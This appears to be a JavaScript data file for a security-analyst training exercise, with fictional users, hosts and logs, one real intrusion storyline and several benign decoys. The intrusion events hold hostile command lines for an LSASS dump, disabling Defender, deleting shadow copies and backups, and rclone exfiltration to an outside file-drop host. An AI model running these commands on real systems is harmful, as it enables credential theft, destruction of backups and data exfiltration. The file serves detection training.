(function () {
  const ev = (id, t, source, hostId, event, msg, fields = {}, extra = {}) => Object.assign({ id, t, source, hostId, event, msg, fields }, extra);
  const al = (id, at, title, severity, source, rule, hostId, userId, summary, details, eventIds, iocs, truth, extra = {}) =>
    Object.assign({ id, at, title, severity, source, rule, hostId, userId, summary, details, eventIds, iocs, truth }, extra);

  const users = [
    { id: 'u-dhollis', name: 'Derek Hollis', username: 'dhollis', email: 'dhollis@cfindustrial.com', dept: 'IT', title: 'IT Systems Administrator', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-ncastillo', name: 'Nina Castillo', username: 'ncastillo', email: 'ncastillo@cfindustrial.com', dept: 'IT', title: 'Backup Administrator', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-opratt', name: 'Owen Pratt', username: 'opratt', email: 'opratt@cfindustrial.com', dept: 'IT', title: 'Help Desk Technician', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-famaro', name: 'Felix Amaro', username: 'famaro', email: 'famaro@cfindustrial.com', dept: 'IT', title: 'Network & Infrastructure Manager', manager: 'Renata Osei (VP IT)', location: 'HQ' },
    { id: 'u-ykhatri', name: 'Yusuf Khatri', username: 'ykhatri', email: 'ykhatri@cfindustrial.com', dept: 'IT', title: 'Senior Systems Administrator', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-cdao', name: 'Curtis Dao', username: 'cdao', email: 'cdao@cfindustrial.com', dept: 'IT', title: 'Desktop Support Technician', manager: 'Owen Pratt', location: 'HQ' },
    { id: 'u-strain', name: 'Sophie Tran', username: 'strain', email: 'strain@cfindustrial.com', dept: 'HR', title: 'HR Generalist', manager: 'Celeste Marsh (HR Director)', location: 'HQ' },
    { id: 'u-wboyce', name: 'Walter Boyce', username: 'wboyce', email: 'wboyce@cfindustrial.com', dept: 'Warehouse', title: 'Warehouse Supervisor', manager: 'Grant Ibe (Operations Director)', location: 'HQ Distribution Center' },
    { id: 'u-tmull', name: 'Travis Mull', username: 'tmull', email: 'tmull@cfindustrial.com', dept: 'Warehouse', title: 'Shipping Clerk', manager: 'Walter Boyce', location: 'HQ Distribution Center' },
    { id: 'u-hvoss', name: 'Hannah Voss', username: 'hvoss', email: 'hvoss@cfindustrial.com', dept: 'Finance', title: 'Finance Analyst', manager: 'Mara Lindgren (Controller)', location: 'HQ' },
    { id: 'u-pensley', name: 'Paula Ensley', username: 'pensley', email: 'pensley@cfindustrial.com', dept: 'Finance', title: 'Accounts Payable Clerk', manager: 'Hannah Voss', location: 'HQ' },
    { id: 'u-dkowalski', name: 'Dmitri Kowalski', username: 'dkowalski', email: 'dkowalski@cfindustrial.com', dept: 'IT', title: 'Database Administrator', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-rcastellano', name: 'Renee Castellano', username: 'rcastellano', email: 'rcastellano@cfindustrial.com', dept: 'Quality', title: 'Quality Assurance Lead', manager: 'Omar Deeb (QA Director)', location: 'Plant 1' },
    { id: 'u-vnakamura', name: 'Victor Nakamura', username: 'vnakamura', email: 'vnakamura@cfindustrial.com', dept: 'Plant1', title: 'Plant Manager', manager: 'VP of Operations', location: 'Plant 1' },
    { id: 'u-iferraro', name: 'Isabel Ferraro', username: 'iferraro', email: 'iferraro@cfindustrial.com', dept: 'Procurement', title: 'Procurement Specialist', manager: 'Procurement Director', location: 'HQ' },
    { id: 'u-bshaw', name: 'Brendan Shaw', username: 'bshaw', email: 'bshaw@cfindustrial.com', dept: 'Plant2', title: 'Plant Engineer', manager: 'Victor Nakamura', location: 'Plant 2' },
    { id: 'u-todom', name: 'Tasha Odom', username: 'todom', email: 'todom@cfindustrial.com', dept: 'Executive', title: 'Executive Assistant', manager: 'CEO', location: 'HQ' },
    { id: 'u-mquinn', name: 'Miles Quinn', username: 'mquinn', email: 'mquinn@cfindustrial.com', dept: 'IT', title: 'ERP Systems Analyst', manager: 'Felix Amaro', location: 'HQ' },
    { id: 'u-svc-backup', name: 'svc-backup (Veeam Backup Service)', username: 'svc-backup', email: 'svc-backup@cfindustrial.com', dept: 'IT', title: 'Service Account - Veeam Backup', manager: 'Nina Castillo', location: 'HQ' },
    { id: 'u-svc-tenable', name: 'svc-tenable-scan (Tenable Scanner)', username: 'svc-tenable-scan', email: 'svc-tenable-scan@cfindustrial.com', dept: 'IT', title: 'Service Account - Tenable Scanner', manager: 'Felix Amaro', location: 'HQ' }
  ];

  const hosts = [
    { id: 'h-dc01', hostname: 'DC01', ip: '10.40.0.10', os: 'Windows Server 2022', type: 'dc', userId: null, dept: 'IT', criticality: 'crown', agent: '7.6.2' },
    { id: 'h-dc02', hostname: 'DC02', ip: '10.40.0.11', os: 'Windows Server 2022', type: 'dc', userId: null, dept: 'IT', criticality: 'crown', agent: '7.6.2' },
    { id: 'h-sccm01', hostname: 'SCCM01', ip: '10.40.0.20', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-bkp01', hostname: 'BKP01', ip: '10.40.0.21', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-jump01', hostname: 'JUMP01', ip: '10.40.0.30', os: 'Windows Server 2022', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-sql01', hostname: 'SQL01', ip: '10.40.0.40', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-fs01', hostname: 'FS01', ip: '10.40.0.50', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-fs02', hostname: 'FS02', ip: '10.40.0.51', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'high', agent: '7.6.2' },
    { id: 'h-tenscan01', hostname: 'TENSCAN01', ip: '10.40.0.60', os: 'Windows Server 2019', type: 'server', userId: null, dept: 'IT', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-dhollis', hostname: 'WKS-DHOLLIS', ip: '10.40.11.12', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-dhollis', dept: 'IT', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-ykhatri', hostname: 'WKS-YKHATRI', ip: '10.40.11.17', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-ykhatri', dept: 'IT', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-ncastillo', hostname: 'WKS-NCASTILLO', ip: '10.40.11.13', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-ncastillo', dept: 'IT', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-mquinn', hostname: 'WKS-MQUINN', ip: '10.40.11.18', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-mquinn', dept: 'IT', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-strain', hostname: 'WKS-STRAIN', ip: '10.40.12.21', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-strain', dept: 'HR', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-hvoss', hostname: 'WKS-HVOSS', ip: '10.40.13.31', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-hvoss', dept: 'Finance', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-pensley', hostname: 'WKS-PENSLEY', ip: '10.40.13.33', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-pensley', dept: 'Finance', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-iferraro', hostname: 'WKS-IFERRARO', ip: '10.40.13.32', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-iferraro', dept: 'Procurement', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-wboyce', hostname: 'WKS-WBOYCE', ip: '10.40.14.63', os: 'Windows 10 Pro', type: 'workstation', userId: 'u-wboyce', dept: 'Warehouse', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-tmull', hostname: 'WKS-TMULL', ip: '10.40.14.64', os: 'Windows 10 Pro', type: 'workstation', userId: 'u-tmull', dept: 'Warehouse', criticality: 'low', agent: '7.6.2' },
    { id: 'h-ws-rcastellano', hostname: 'WKS-RCASTELLANO', ip: '10.40.15.41', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-rcastellano', dept: 'Quality', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-plant2-eng01', hostname: 'PLANT2-ENG01', ip: '10.40.21.15', os: 'Windows 10 Pro', type: 'workstation', userId: 'u-bshaw', dept: 'Plant2', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-vnakamura', hostname: 'WKS-VNAKAMURA', ip: '10.40.20.11', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-vnakamura', dept: 'Plant1', criticality: 'medium', agent: '7.6.2' },
    { id: 'h-ws-todom', hostname: 'WKS-TODOM', ip: '10.40.10.5', os: 'Windows 11 Pro', type: 'workstation', userId: 'u-todom', dept: 'Executive', criticality: 'low', agent: '7.6.2' }
  ];

  const events = [];
  const E = (...a) => events.push(ev(...a));

  // ---------- TP storyline: svc-backup compromise, WKS-WBOYCE -> FS02 -> BKP01, discovery, tamper, staging, exfil ----------
  E('e-tp-001', '06:38:10', 'EDR', 'h-ws-wboyce', 'ProcessCreate', 'EDR: powershell.exe -nop -w hidden -enc JABzAD0AT...  parent=explorer.exe user=CORP\\wboyce', { process: 'powershell.exe', parent: 'explorer.exe' }, { user: 'wboyce', src: '10.40.14.63' });
  E('e-tp-002', '06:39:02', 'EDR', 'h-ws-wboyce', 'ProcessCreate', 'EDR: rundll32.exe comsvcs.dll MiniDump 912 C:\\Users\\Public\\dw1.tmp full  parent=cmd.exe user=CORP\\wboyce', { process: 'rundll32.exe', parent: 'cmd.exe' }, { user: 'wboyce', src: '10.40.14.63' });
  E('e-tp-003', '06:39:40', 'WinEvent', 'h-ws-wboyce', '4688 Process Creation', '4688: NewProcessName=C:\\Windows\\System32\\cmd.exe CommandLine="cmd /c copy C:\\Users\\Public\\dw1.tmp C:\\Users\\Public\\dw1.bak" SubjectUserName=wboyce', { commandLine: 'cmd /c copy C:\\Users\\Public\\dw1.tmp C:\\Users\\Public\\dw1.bak' }, { user: 'wboyce' });
  E('e-tp-004', '06:40:55', 'Firewall', 'h-ws-wboyce', 'Allow', 'FW ALLOW proto=TCP src=10.40.14.63:52110 dst=10.40.0.51:5985 app=powershell.exe (WinRM/HTTP)', { action: 'allow', port: 5985 }, { user: 'wboyce', src: '10.40.14.63', dst: '10.40.0.51' });
  E('e-tp-005', '06:47:02', 'WinEvent', 'h-fs02', '4624 Logon', '4624: LogonType=3 SubjectUserName=svc-backup WorkstationName=WKS-WBOYCE IpAddress=10.40.14.63 AuthenticationPackage=NTLM LogonProcess=NtLmSsp', { logonType: 3, authPkg: 'NTLM' }, { user: 'svc-backup', src: '10.40.14.63', dst: '10.40.0.51' });
  E('e-tp-006', '06:47:40', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=C:\\Windows\\System32\\cmd.exe CommandLine="whoami /all" SubjectUserName=svc-backup', { commandLine: 'whoami /all' }, { user: 'svc-backup' });
  E('e-tp-007', '06:48:15', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=powershell.exe CommandLine="powershell -nop -w hidden -c \\"net group \'\'domain admins\'\' /domain\\"" SubjectUserName=svc-backup', { commandLine: 'net group "domain admins" /domain' }, { user: 'svc-backup' });
  E('e-tp-008', '06:49:10', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=nltest.exe CommandLine="nltest /domain_trusts" SubjectUserName=svc-backup', { commandLine: 'nltest /domain_trusts' }, { user: 'svc-backup' });
  E('e-tp-009', '06:49:55', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=C:\\Windows\\Temp\\adf\\AdFind.exe CommandLine="AdFind.exe -f (objectcategory=person) -dsq -list" SubjectUserName=svc-backup', { commandLine: 'AdFind.exe -f (objectcategory=person) -dsq -list' }, { user: 'svc-backup' });
  E('e-tp-010', '06:50:40', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=cmd.exe CommandLine="net localgroup administrators" SubjectUserName=svc-backup', { commandLine: 'net localgroup administrators' }, { user: 'svc-backup' });
  E('e-tp-011', '06:52:10', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=powershell.exe CommandLine="powershell -c Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true" SubjectUserName=svc-backup', { commandLine: 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true' }, { user: 'svc-backup' });
  E('e-tp-012', '06:52:45', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=sc.exe CommandLine="sc stop WinDefend" SubjectUserName=svc-backup', { commandLine: 'sc stop WinDefend' }, { user: 'svc-backup' });
  E('e-tp-013', '06:53:05', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=sc.exe CommandLine="sc config WinDefend start= disabled" SubjectUserName=svc-backup', { commandLine: 'sc config WinDefend start= disabled' }, { user: 'svc-backup' });
  E('e-tp-014', '06:53:50', 'WinEvent', 'h-fs02', 'Defender Tamper Protection', 'Defender: Tamper Protection partially blocked configuration change to Real-Time Protection; some settings still applied', { feature: 'TamperProtection', result: 'partial-block' }, { user: 'svc-backup' });
  E('e-tp-015', '06:55:20', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=vssadmin.exe CommandLine="vssadmin delete shadows /all" SubjectUserName=svc-backup', { commandLine: 'vssadmin delete shadows /all' }, { user: 'svc-backup' });
  E('e-tp-016', '06:56:50', 'WinEvent', 'h-fs02', '7045 Service Install', '7045: ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service StartType=demand start AccountName=LocalSystem', { serviceName: 'PSEXESVC' }, { user: 'svc-backup' });
  E('e-tp-017', '06:57:30', 'WinEvent', 'h-bkp01', '4624 Logon', '4624: LogonType=3 SubjectUserName=svc-backup WorkstationName=FS02 IpAddress=10.40.0.51 AuthenticationPackage=NTLM', { logonType: 3, authPkg: 'NTLM' }, { user: 'svc-backup', src: '10.40.0.51', dst: '10.40.0.21' });
  E('e-tp-018', '06:58:10', 'WinEvent', 'h-bkp01', '4688 Process Creation', '4688: NewProcessName=wbadmin.exe CommandLine="wbadmin delete catalog -quiet" SubjectUserName=svc-backup', { commandLine: 'wbadmin delete catalog -quiet' }, { user: 'svc-backup' });
  E('e-tp-019', '06:58:50', 'WinEvent', 'h-bkp01', '4688 Process Creation', '4688: NewProcessName=powershell.exe CommandLine="Get-VBRBackup | Remove-VBRBackup -Confirm:$false" SubjectUserName=svc-backup', { commandLine: 'Get-VBRBackup | Remove-VBRBackup -Confirm:$false' }, { user: 'svc-backup' });
  E('e-tp-020', '06:59:40', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Daily-FS-Backup" repository integrity check FAILED - 3 restore points missing from Repo-Primary', { job: 'Daily-FS-Backup', status: 'Failed' }, { user: 'svc-backup' });
  E('e-tp-021', '07:01:00', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=cmd.exe CommandLine="schtasks /create /tn \\"WindowsUpdateCheck\\" /tr C:\\Windows\\Temp\\svcupd.exe /sc onstart /ru SYSTEM" SubjectUserName=svc-backup', { commandLine: 'schtasks /create /tn WindowsUpdateCheck /tr C:\\Windows\\Temp\\svcupd.exe /sc onstart /ru SYSTEM' }, { user: 'svc-backup' });
  E('e-tp-022', '07:05:00', 'EDR', 'h-fs02', 'ProcessCreate', 'EDR: 7za.exe a -mx1 C:\\Windows\\Temp\\upd_cache.7z \\\\FS02\\Finance$ \\\\FS02\\Engineering$  parent=powershell.exe user=svc-backup', { process: '7za.exe', parent: 'powershell.exe' }, { user: 'svc-backup' });
  E('e-tp-023', '07:09:40', 'EDR', 'h-fs02', 'FileCreate', 'EDR: file created C:\\Windows\\Temp\\upd_cache.7z size=812MB by pid of 7za.exe', { path: 'C:\\Windows\\Temp\\upd_cache.7z' }, { user: 'svc-backup' });
  E('e-tp-024', '07:12:15', 'EDR', 'h-fs02', 'ProcessCreate', 'EDR: rclone.exe copy C:\\Windows\\Temp\\upd_cache.7z remote:backup --config C:\\Windows\\Temp\\rc.conf  parent=powershell.exe user=svc-backup', { process: 'rclone.exe', parent: 'powershell.exe' }, { user: 'svc-backup' });
  E('e-tp-025', '07:13:00', 'DNS', 'h-fs02', 'DNS Query', 'DNS query qname=swift-filedrop.com qtype=A from 10.40.0.51', { domain: 'swift-filedrop.com' }, { user: 'svc-backup', src: '10.40.0.51' });
  E('e-tp-026', '07:13:20', 'Firewall', 'h-fs02', 'Allow', 'FW ALLOW proto=TCP src=10.40.0.51:51322 dst=203.0.113.77:443 bytes_out=812MB app=rclone.exe', { action: 'allow', bytesOut: '812MB' }, { user: 'svc-backup', src: '10.40.0.51', dst: '203.0.113.77' });
  E('e-tp-027', '07:20:10', 'EDR', 'h-fs02', 'NetworkConnect', 'EDR: rclone.exe -> 203.0.113.77:443 domain=swift-filedrop.com proto=TCP TLS1.2', { domain: 'swift-filedrop.com' }, { user: 'svc-backup', src: '10.40.0.51', dst: '203.0.113.77' });
  E('e-tp-028', '07:21:00', 'WinEvent', 'h-fs02', '4688 Process Creation', '4688: NewProcessName=powershell.exe CommandLine="Remove-Item C:\\Windows\\Temp\\upd_cache.7z -Force" SubjectUserName=svc-backup', { commandLine: 'Remove-Item C:\\Windows\\Temp\\upd_cache.7z -Force' }, { user: 'svc-backup' });
  E('e-tp-029', '07:22:40', 'EDR', 'h-fs02', 'FileDelete', 'EDR: file deleted C:\\Windows\\Temp\\upd_cache.7z by powershell.exe', { path: 'C:\\Windows\\Temp\\upd_cache.7z' }, { user: 'svc-backup' });
  E('e-tp-030', '01:15:00', 'WinEvent', 'h-bkp01', '4624 Logon', '4624: LogonType=3 SubjectUserName=svc-backup WorkstationName=BKP01 IpAddress=10.40.0.21 AuthenticationPackage=Kerberos (nightly job baseline)', { logonType: 3, authPkg: 'Kerberos' }, { user: 'svc-backup', src: '10.40.0.21' });
  E('e-tp-031', '01:16:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Daily-FS-Backup" completed Result=Success FilesProcessed=140221', { job: 'Daily-FS-Backup', status: 'Success' }, { user: 'svc-backup' });
  E('e-tp-032', '06:45:10', 'EDR', 'h-ws-wboyce', 'ProcessCreate', 'EDR: cmd.exe /c tasklist /v  parent=powershell.exe user=CORP\\wboyce', { process: 'tasklist.exe', parent: 'cmd.exe' }, { user: 'wboyce' });
  E('e-tp-033', '06:46:20', 'EDR', 'h-ws-wboyce', 'FileDelete', 'EDR: file deleted C:\\Users\\Public\\dw1.tmp by rundll32.exe (cleanup of LSASS dump artifact)', { path: 'C:\\Users\\Public\\dw1.tmp' }, { user: 'wboyce' });
  E('e-tp-034', '07:00:10', 'EDR', 'h-fs02', 'ProcessCreate', 'EDR: cmd.exe /c dir \\\\FS02\\Finance$ /s /b  parent=powershell.exe user=svc-backup', { process: 'cmd.exe', parent: 'powershell.exe' }, { user: 'svc-backup' });
  E('e-tp-035', '07:00:35', 'EDR', 'h-fs02', 'ProcessCreate', 'EDR: cmd.exe /c dir \\\\FS02\\Engineering$ /s /b  parent=powershell.exe user=svc-backup', { process: 'cmd.exe', parent: 'powershell.exe' }, { user: 'svc-backup' });
  E('e-tp-036', '06:44:05', 'WinEvent', 'h-ws-wboyce', '4688 Process Creation', '4688: NewProcessName=powershell.exe CommandLine="powershell -c New-PSSession -ComputerName FS02 -Credential $cred" SubjectUserName=wboyce', { commandLine: 'New-PSSession -ComputerName FS02 -Credential $cred' }, { user: 'wboyce' });
  E('e-tp-037', '07:23:30', 'WinEvent', 'h-fs02', '4634 Logoff', '4634: SubjectUserName=svc-backup LogonType=3 (session closed)', { logonType: 3 }, { user: 'svc-backup' });

  // ---------- FP1: SCCM Patch Tuesday mass reboot / service-stop noise ----------
  E('e-fp1-01', '00:35:10', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: Package "Nov-2026-SecurityRollup" deployment started, target collection="All Systems" (847 members)', { package: 'Nov-2026-SecurityRollup' });
  E('e-fp1-02', '07:02:44', 'WinEvent', 'h-ws-hvoss', '7036 Service Control Manager', '7036: Service "Windows Defender Antivirus Service" entered the stopped state', {}, { user: 'hvoss' });
  E('e-fp1-03', '07:03:10', 'WinEvent', 'h-ws-tmull', '7036 Service Control Manager', '7036: Service "Print Spooler" entered the stopped state', {}, { user: 'tmull' });
  E('e-fp1-04', '07:04:02', 'WinEvent', 'h-fs01', '1074 System shutdown/restart', '1074: Process C:\\Windows\\CCM\\CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' });
  E('e-fp1-05', '07:05:00', 'WinEvent', 'h-sql01', '1074 System shutdown/restart', '1074: Process C:\\Windows\\CCM\\CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' });
  E('e-fp1-06', '07:06:20', 'WinEvent', 'h-ws-rcastellano', '1074 System shutdown/restart', '1074: Process CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' }, { user: 'rcastellano' });
  E('e-fp1-07', '07:07:00', 'WinEvent', 'h-ws-strain', '7036 Service Control Manager', '7036: Service "BITS" entered the stopped state', {}, { user: 'strain' });
  E('e-fp1-08', '07:08:00', 'WinEvent', 'h-ws-iferraro', '1074 System shutdown/restart', '1074: Process CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' }, { user: 'iferraro' });
  E('e-fp1-09', '07:40:00', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: Compliance report for "Nov-2026-SecurityRollup" - 812/847 installed, 35 pending reboot retry', { package: 'Nov-2026-SecurityRollup', compliant: 812 });
  E('e-fp1-10', '08:00:15', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: Maintenance window "Patch-Tuesday-AM" closed, phased reboot sequence complete for Wave 1', { window: 'Patch-Tuesday-AM' });

  // ---------- FP2: Veeam/robocopy repo migration mistaken for mass file modification ----------
  E('e-fp2-01', '02:03:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Repo-Migration-FS01" started mode=RobocopyMirror source=\\\\FS01\\Shared$ dest=\\\\NAS02\\Shared_mig$', { job: 'Repo-Migration-FS01' });
  E('e-fp2-02', '02:04:15', 'EDR', 'h-fs01', 'FileModify', 'EDR: robocopy.exe modified/renamed \\\\FS01\\Shared$\\Engineering\\drawings\\rev14\\part-0042.dwg', { path: '\\\\FS01\\Shared$\\Engineering\\drawings\\rev14\\part-0042.dwg' });
  E('e-fp2-03', '02:10:00', 'WinEvent', 'h-fs01', '4688 Process Creation', '4688: NewProcessName=robocopy.exe CommandLine="robocopy \\\\FS01\\Shared$ \\\\NAS02\\Shared_mig$ /MIR /Z /COPYALL" SubjectUserName=svc-veeam-repl', { commandLine: 'robocopy \\\\FS01\\Shared$ \\\\NAS02\\Shared_mig$ /MIR /Z /COPYALL' }, { user: 'svc-veeam-repl' });
  E('e-fp2-04', '02:30:00', 'EDR', 'h-fs01', 'FileModify', 'EDR: robocopy.exe modified/renamed 412 files under \\\\FS01\\Shared$\\Finance\\archive (batch 4 of 9)', { path: '\\\\FS01\\Shared$\\Finance\\archive' });
  E('e-fp2-05', '03:10:00', 'EDR', 'h-fs01', 'FileModify', 'EDR: robocopy.exe modified/renamed 980 files under \\\\FS01\\Shared$\\QA\\reports (batch 6 of 9)', { path: '\\\\FS01\\Shared$\\QA\\reports' });
  E('e-fp2-06', '04:00:00', 'WinEvent', 'h-fs01', '4663 Object Access', '4663: ObjectName=\\\\FS01\\Shared$ AccessMask=rename SubjectUserName=svc-veeam-repl (bulk rename pass, robocopy /MIR)', {}, { user: 'svc-veeam-repl' });
  E('e-fp2-07', '04:55:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Repo-Migration-FS01" completed Result=Success FilesCopied=18342 FilesSkipped=0', { job: 'Repo-Migration-FS01', status: 'Success' });
  E('e-fp2-08', '05:00:10', 'WinEvent', 'h-fs01', 'SIEM Correlation', 'SIEM: rule SIEM-Ransom-010 notes elevated file modify/rename rate (18k events/12min) on FS01, source process=robocopy.exe (signed, Microsoft)', { rate: '18000/12min' });

  // ---------- FP3: Tenable authenticated scan -> failed logon spike ----------
  E('e-fp3-01', '06:00:05', 'WinEvent', 'h-dc01', '4625 Logon Failure', '4625: TargetUserName=admin WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-02', '06:00:08', 'WinEvent', 'h-ws-rcastellano', '4625 Logon Failure', '4625: TargetUserName=administrator WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-03', '06:00:12', 'WinEvent', 'h-fs01', '4625 Logon Failure', '4625: TargetUserName=root WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-04', '06:00:20', 'WinEvent', 'h-sql01', '4625 Logon Failure', '4625: TargetUserName=sa WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-05', '06:00:28', 'WinEvent', 'h-ws-strain', '4625 Logon Failure', '4625: TargetUserName=administrator WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-06', '06:00:35', 'WinEvent', 'h-ws-pensley', '4625 Logon Failure', '4625: TargetUserName=admin WorkstationName=TENSCAN01 IpAddress=10.40.0.60 FailureReason="Unknown username or bad password"', {}, { src: '10.40.0.60' });
  E('e-fp3-07', '06:01:00', 'Cloud', 'h-tenscan01', 'Tenable Scan Log', 'Tenable: Scan "Monthly Authenticated Compliance Scan" started, policy="CIS Windows Server", credentials=svc-tenable-scan, targets=847', { scan: 'Monthly Authenticated Compliance Scan' }, { user: 'svc-tenable-scan', src: '10.40.0.60' });
  E('e-fp3-08', '08:55:00', 'Cloud', 'h-tenscan01', 'Tenable Scan Log', 'Tenable: Scan "Monthly Authenticated Compliance Scan" completed, 847/847 targets scanned, 0 critical new findings', { scan: 'Monthly Authenticated Compliance Scan' }, { user: 'svc-tenable-scan' });

  // ---------- FP4: Tenable scan admin-share connections look like lateral movement ----------
  E('e-fp4-01', '06:02:00', 'WinEvent', 'h-ws-dhollis', '5140 Network Share Access', '5140: ShareName=\\\\*\\ADMIN$ SubjectUserName=svc-tenable-scan IpAddress=10.40.0.60', {}, { user: 'svc-tenable-scan', src: '10.40.0.60' });
  E('e-fp4-02', '06:02:40', 'WinEvent', 'h-sql01', '5140 Network Share Access', '5140: ShareName=\\\\*\\C$ SubjectUserName=svc-tenable-scan IpAddress=10.40.0.60', {}, { user: 'svc-tenable-scan', src: '10.40.0.60' });
  E('e-fp4-03', '06:03:10', 'WinEvent', 'h-ws-mquinn', '5140 Network Share Access', '5140: ShareName=\\\\*\\ADMIN$ SubjectUserName=svc-tenable-scan IpAddress=10.40.0.60', {}, { user: 'svc-tenable-scan', src: '10.40.0.60' });
  E('e-fp4-04', '06:03:40', 'WinEvent', 'h-ws-iferraro', '5140 Network Share Access', '5140: ShareName=\\\\*\\C$ SubjectUserName=svc-tenable-scan IpAddress=10.40.0.60', {}, { user: 'svc-tenable-scan', src: '10.40.0.60' });
  E('e-fp4-05', '06:05:00', 'Cloud', 'h-tenscan01', 'Tenable Scan Log', 'Tenable: plugin "SMB Registry: Start the Registry Service during the scan" executed sequentially across 35 targets', { plugin: 'SMB Registry Start' }, { user: 'svc-tenable-scan' });
  E('e-fp4-06', '06:06:00', 'WinEvent', 'h-dc01', 'SIEM Correlation', 'SIEM: rule NDR-Lateral-021 flags svc-tenable-scan sequential SMB admin-share connections to 35 hosts within 20 minutes', {}, { user: 'svc-tenable-scan' });

  // ---------- FP5: Yusuf Khatri legitimately runs PsExec from JUMP01 during patch window ----------
  E('e-fp5-01', '09:08:00', 'WinEvent', 'h-jump01', '4624 Logon', '4624: LogonType=10 SubjectUserName=ykhatri IpAddress=10.40.11.17 (RDP from WKS-YKHATRI)', { logonType: 10 }, { user: 'ykhatri', src: '10.40.11.17' });
  E('e-fp5-02', '09:09:12', 'EDR', 'h-jump01', 'ProcessCreate', 'EDR: PsExec64.exe \\\\WKS-STRAIN cmd /c "ipconfig /renew"  parent=cmd.exe user=CORP\\ykhatri signed=true publisher="Sysinternals"', { process: 'PsExec64.exe', parent: 'cmd.exe' }, { user: 'ykhatri' });
  E('e-fp5-03', '09:09:40', 'WinEvent', 'h-ws-strain', '7045 Service Install', '7045: ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem', { serviceName: 'PSEXESVC' }, { user: 'ykhatri' });
  E('e-fp5-04', '09:09:55', 'EDR', 'h-jump01', 'ProcessCreate', 'EDR: PsExec64.exe \\\\WKS-IFERRARO cmd /c "ipconfig /renew"  parent=cmd.exe user=CORP\\ykhatri signed=true publisher="Sysinternals"', { process: 'PsExec64.exe', parent: 'cmd.exe' }, { user: 'ykhatri' });
  E('e-fp5-05', '09:10:15', 'WinEvent', 'h-ws-iferraro', '7045 Service Install', '7045: ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem', { serviceName: 'PSEXESVC' }, { user: 'ykhatri' });
